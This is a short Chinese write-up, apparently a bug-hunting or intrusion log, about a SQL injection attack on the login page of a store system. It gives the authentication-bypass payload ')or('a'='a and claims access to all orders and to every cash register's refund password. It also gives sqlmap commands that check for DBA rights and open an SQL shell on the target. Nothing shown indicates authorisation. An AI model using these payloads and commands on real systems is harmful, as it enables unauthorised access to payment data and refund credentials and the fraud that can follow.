---
title: 登录口SQL
slug: 0135
---
# 登录口SQL

目标url：http://XXXcom/login.aspx

万能密码进入后台，万能密码')or('a'='a



对浙大店内商店的所有的订单有相应的查询权限

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970748926-c79aa246-103b-4a50-8e58-f36a0c48d16f.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970749319-4493e2ff-d7aa-4552-a763-d185da0bd929.png)

所有收银机的退款密码

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970749357-8a480c0d-d2da-47f0-8f2d-f6ec16fd3455.png)

对登陆页面进行跑sqlmap

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970749263-4253965d-a19e-4855-9bd6-add48327e984.png)

python sqlmap.py -r 1.txt --batch --random-agent --time-sec=2 --risk 3 --is-dba

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970749759-77de6bea-c80b-4bfe-b41a-a2ab39ee667b.png)

python sqlmap.py -r 1.txt --batch --random-agent --time-sec=2 --risk 3 --sql-shell

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779970750001-b225f39a-0b4e-42a4-844b-b2a0e8f0c11f.png)